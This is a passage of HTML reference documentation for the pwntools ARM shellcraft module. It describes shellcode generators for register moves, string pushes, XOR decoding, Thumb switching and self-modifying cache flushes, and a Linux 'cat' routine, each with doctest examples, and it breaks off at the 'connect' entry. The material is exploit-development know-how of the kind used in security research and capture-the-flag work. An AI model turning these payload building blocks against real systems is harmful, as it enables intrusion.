<h5><a class="reference internal" href="#module-pwnlib.shellcraft.arm" title="pwnlib.shellcraft.arm"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft.arm</span></code></a> &#8212; Shellcode for ARM<a class="headerlink" href="#pwnlib-shellcraft-arm-shellcode-for-arm" title="Permalink to this headline">¶</a></h5>
<div class="section" id="module-pwnlib.shellcraft.arm">
<span id="pwnlib-shellcraft-arm"></span><h6><a class="reference internal" href="#module-pwnlib.shellcraft.arm" title="pwnlib.shellcraft.arm"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft.arm</span></code></a><a class="headerlink" href="#module-pwnlib.shellcraft.arm" title="Permalink to this headline">¶</a></h6>
<p>Shellcraft module containing generic ARM little endian shellcodes.</p>
<dl class="function">
<dt id="pwnlib.shellcraft.arm.crash">
<code class="descclassname">pwnlib.shellcraft.arm.</code><code class="descname">crash</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/crash.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.crash" title="Permalink to this definition">¶</a></dt>
<dd><p>Crash.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">crash</span><span class="p">())</span><span class="o">.</span><span class="n">poll</span><span class="p">(</span><span class="kc">True</span><span class="p">)</span>
<span class="go">-11</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.infloop">
<code class="descclassname">pwnlib.shellcraft.arm.</code><code class="descname">infloop</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/infloop.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.infloop" title="Permalink to this definition">¶</a></dt>
<dd><p>An infinite loop.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.itoa">
<code class="descclassname">pwnlib.shellcraft.arm.</code><code class="descname">itoa</code><span class="sig-paren">(</span><em>v</em>, <em>buffer='sp'</em>, <em>allocate_stack=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/itoa.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.itoa" title="Permalink to this definition">¶</a></dt>
<dd><p>Converts an integer into its string representation, and pushes it
onto the stack.  Uses registers r0-r5.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>v</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a><em>, </em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Integer constant or register that contains the value to convert.</li>
<li><strong>alloca</strong> &#8211; </li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">arm</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r0&#39;</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">arm</span><span class="o">.</span><span class="n">itoa</span><span class="p">(</span><span class="s1">&#39;r0&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">arm</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;sp&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="go">&#39;3735928559\x00&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.memcpy">
<code class="descclassname">pwnlib.shellcraft.arm.</code><code class="descname">memcpy</code><span class="sig-paren">(</span><em>dest</em>, <em>src</em>, <em>n</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/memcpy.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.memcpy" title="Permalink to this definition">¶</a></dt>
<dd><p>Copies memory.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>dest</strong> &#8211; Destination address</li>
<li><strong>src</strong> &#8211; Source address</li>
<li><strong>n</strong> &#8211; Number of bytes</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.mov">
<code class="descclassname">pwnlib.shellcraft.arm.</code><code class="descname">mov</code><span class="sig-paren">(</span><em>dst</em>, <em>src</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/mov.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.mov" title="Permalink to this definition">¶</a></dt>
<dd><p>Move src into dest.</p>
<p>Support for automatically avoiding newline and null bytes has to be done.</p>
<p>If src is a string that is not a register, then it will locally set
<cite>context.arch</cite> to <cite>&#8216;arm&#8217;</cite> and use <code class="xref py py-func docutils literal"><span class="pre">pwnlib.constants.eval()</span></code> to evaluate the
string. Note that this means that this shellcode can change behavior depending
on the value of <cite>context.os</cite>.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">arm</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r0&#39;</span><span class="p">,</span><span class="s1">&#39;r1&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov  r0, r1</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">arm</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r0&#39;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov  r0, #5</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">arm</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r0&#39;</span><span class="p">,</span> <span class="mh">0x34532</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    movw r0, #0x34532 &amp; 0xffff</span>
<span class="go">    movt r0, #0x34532 &gt;&gt; 16</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">arm</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r0&#39;</span><span class="p">,</span> <span class="mh">0x101</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    movw r0, #0x101</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">arm</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r0&#39;</span><span class="p">,</span> <span class="mh">0xff</span> <span class="o">&lt;&lt;</span> <span class="mi">14</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov  r0, #0x3fc000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">arm</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r0&#39;</span><span class="p">,</span> <span class="mh">0xff</span> <span class="o">&lt;&lt;</span> <span class="mi">15</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    movw r0, #0x7f8000 &amp; 0xffff</span>
<span class="go">    movt r0, #0x7f8000 &gt;&gt; 16</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">arm</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r0&#39;</span><span class="p">,</span> <span class="mh">0xf00d0000</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    eor  r0, r0</span>
<span class="go">    movt r0, #0xf00d0000 &gt;&gt; 16</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">arm</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r0&#39;</span><span class="p">,</span> <span class="mh">0xffff00ff</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mvn  r0, #(0xffff00ff ^ (-1))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">arm</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r0&#39;</span><span class="p">,</span> <span class="mh">0x1fffffff</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mvn  r0, #(0x1fffffff ^ (-1))</span>
</pre></div>
</div>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>dest</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; ke destination register.</li>
<li><strong>src</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Either the input register, or an immediate value.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.nop">
<code class="descclassname">pwnlib.shellcraft.arm.</code><code class="descname">nop</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/nop.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.nop" title="Permalink to this definition">¶</a></dt>
<dd><p>A nop instruction.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.push">
<code class="descclassname">pwnlib.shellcraft.arm.</code><code class="descname">push</code><span class="sig-paren">(</span><em>word</em>, <em>register='r12'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/push.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.push" title="Permalink to this definition">¶</a></dt>
<dd><p>Pushes a 32-bit integer onto the stack.  Uses r12 as a temporary register.</p>
<p>r12 is defined as the inter-procedural scartch register ($ip),
so this should not interfere with most usage.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>word</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a><em>, </em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The word to push</li>
<li><strong>tmpreg</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Register to use as a temporary register.  R7 is used by default.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.pushstr">
<code class="descclassname">pwnlib.shellcraft.arm.</code><code class="descname">pushstr</code><span class="sig-paren">(</span><em>string</em>, <em>append_null=True</em>, <em>register='r7'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/pushstr.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.pushstr" title="Permalink to this definition">¶</a></dt>
<dd><p>Pushes a string onto the stack.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>string</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The string to push.</li>
<li><strong>append_null</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Whether to append a single NULL-byte before pushing.</li>
<li><strong>register</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Temporary register to use.  By default, R7 is used.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">arm</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s2">&quot;Hello!&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;Hello!\x00A&#39; */</span>
<span class="go">    movw r7, #0x4100216f &amp; 0xffff</span>
<span class="go">    movt r7, #0x4100216f &gt;&gt; 16</span>
<span class="go">    push {r7}</span>
<span class="go">    movw r7, #0x6c6c6548 &amp; 0xffff</span>
<span class="go">    movt r7, #0x6c6c6548 &gt;&gt; 16</span>
<span class="go">    push {r7}</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.pushstr_array">
<code class="descclassname">pwnlib.shellcraft.arm.</code><code class="descname">pushstr_array</code><span class="sig-paren">(</span><em>reg</em>, <em>array</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/pushstr_array.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.pushstr_array" title="Permalink to this definition">¶</a></dt>
<dd><p>Pushes an array/envp-style array of pointers onto the stack.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>reg</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Destination register to hold the pointer.</li>
<li><strong>array</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a><em>,</em><a class="reference internal" href="index.html#pwnlib.protocols.adb.AdbClient.list" title="pwnlib.protocols.adb.AdbClient.list"><em>list</em></a>) &#8211; Single argument or list of arguments to push.
NULL termination is normalized so that each argument
ends with exactly one NULL byte.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.ret">
<code class="descclassname">pwnlib.shellcraft.arm.</code><code class="descname">ret</code><span class="sig-paren">(</span><em>return_value=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/ret.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.ret" title="Permalink to this definition">¶</a></dt>
<dd><p>A single-byte RET instruction.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>return_value</strong> &#8211; Value to return</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;arm&#39;</span><span class="p">):</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">enhex</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">ret</span><span class="p">()))</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">enhex</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">ret</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">enhex</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">ret</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)))</span>
<span class="go">1eff2fe1</span>
<span class="go">000020e01eff2fe1</span>
<span class="go">ef0e0be3ad0e4de31eff2fe1</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.setregs">
<code class="descclassname">pwnlib.shellcraft.arm.</code><code class="descname">setregs</code><span class="sig-paren">(</span><em>reg_context</em>, <em>stack_allowed=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/setregs.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.setregs" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets multiple registers, taking any register dependencies into account
(i.e., given eax=1,ebx=eax, set ebx first).</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>reg_context</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Desired register context</li>
<li><strong>stack_allowed</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Can the stack be used?</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">setregs</span><span class="p">({</span><span class="s1">&#39;r0&#39;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;r2&#39;</span><span class="p">:</span><span class="s1">&#39;r3&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov  r0, #1</span>
<span class="go">    mov  r2, r3</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">setregs</span><span class="p">({</span><span class="s1">&#39;r0&#39;</span><span class="p">:</span><span class="s1">&#39;r1&#39;</span><span class="p">,</span> <span class="s1">&#39;r1&#39;</span><span class="p">:</span><span class="s1">&#39;r0&#39;</span><span class="p">,</span> <span class="s1">&#39;r2&#39;</span><span class="p">:</span><span class="s1">&#39;r3&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov  r2, r3</span>
<span class="go">    eor  r0, r0, r1 /* xchg r0, r1 */</span>
<span class="go">    eor  r1, r0, r1</span>
<span class="go">    eor  r0, r0, r1</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.to_thumb">
<code class="descclassname">pwnlib.shellcraft.arm.</code><code class="descname">to_thumb</code><span class="sig-paren">(</span><em>reg=None</em>, <em>avoid=[]</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/to_thumb.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.to_thumb" title="Permalink to this definition">¶</a></dt>
<dd><p>Go from ARM to THUMB mode.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.trap">
<code class="descclassname">pwnlib.shellcraft.arm.</code><code class="descname">trap</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/trap.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.trap" title="Permalink to this definition">¶</a></dt>
<dd><p>A trap instruction.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.udiv_10">
<code class="descclassname">pwnlib.shellcraft.arm.</code><code class="descname">udiv_10</code><span class="sig-paren">(</span><em>N</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/udiv_10.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.udiv_10" title="Permalink to this definition">¶</a></dt>
<dd><p>Divides r0 by 10.  Result is stored in r0, N and Z flags are updated.</p>
<dl class="docutils">
<dt>Code is from generated from here:</dt>
<dd><a class="reference external" href="https://raw.githubusercontent.com/rofirrim/raspberry-pi-assembler/master/chapter15/magic.py">https://raw.githubusercontent.com/rofirrim/raspberry-pi-assembler/master/chapter15/magic.py</a></dd>
<dt>With code:</dt>
<dd>python magic.py 10 code_for_unsigned</dd>
</dl>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.xor">
<code class="descclassname">pwnlib.shellcraft.arm.</code><code class="descname">xor</code><span class="sig-paren">(</span><em>key</em>, <em>address</em>, <em>count</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/xor.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.xor" title="Permalink to this definition">¶</a></dt>
<dd><p>XORs data a constant value.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>key</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a><em>,</em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; XOR key either as a 4-byte integer,
If a string, length must be a power of two,
and not longer than 4 bytes.</li>
<li><strong>address</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Address of the data (e.g. 0xdead0000, &#8216;rsp&#8217;)</li>
<li><strong>count</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Number of bytes to XOR.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span>  <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;sp&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">xor</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="s1">&#39;sp&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;sp&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span> <span class="o">=</span> <span class="n">run_assembly</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">result</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">expected</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">32</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">result</span> <span class="o">==</span> <span class="n">expected</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

</div>
<div class="section" id="module-pwnlib.shellcraft.arm.linux">
<span id="pwnlib-shellcraft-arm-linux"></span><h6><a class="reference internal" href="#module-pwnlib.shellcraft.arm.linux" title="pwnlib.shellcraft.arm.linux"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft.arm.linux</span></code></a><a class="headerlink" href="#module-pwnlib.shellcraft.arm.linux" title="Permalink to this headline">¶</a></h6>
<p>Shellcraft module containing ARM shellcodes for Linux.</p>
<dl class="function">
<dt id="pwnlib.shellcraft.arm.linux.cacheflush">
<code class="descclassname">pwnlib.shellcraft.arm.linux.</code><code class="descname">cacheflush</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/linux/cacheflush.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.linux.cacheflush" title="Permalink to this definition">¶</a></dt>
<dd><p>Invokes the cache-flush operation, without using any NULL or newline bytes.</p>
<p>Effectively is just:</p>
<blockquote>
<div>mov   r0, #0
mov   r1, #-1
mov   r2, #0
swi   0x9F0002</div></blockquote>
<p>How this works:</p>
<blockquote>
<div>... However, SWI generates a software interrupt and to the
interrupt handler, 0x9F0002 is actually data and as a result will
not be read via the instruction cache, so if we modify the argument
to SWI in our self-modifyign code, the argument will be read
correctly.</div></blockquote>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.linux.cat">
<code class="descclassname">pwnlib.shellcraft.arm.linux.</code><code class="descname">cat</code><span class="sig-paren">(</span><em>filename</em>, <em>fd=1</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/linux/cat.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.linux.cat" title="Permalink to this definition">¶</a></dt>
<dd><p>Opens a file and writes its contents to the specified file descriptor.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">f</span> <span class="o">=</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">mktemp</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">write</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s1">&#39;FLAG</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">arm</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">cat</span><span class="p">(</span><span class="n">f</span><span class="p">))</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;FLAG\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.linux.connect">
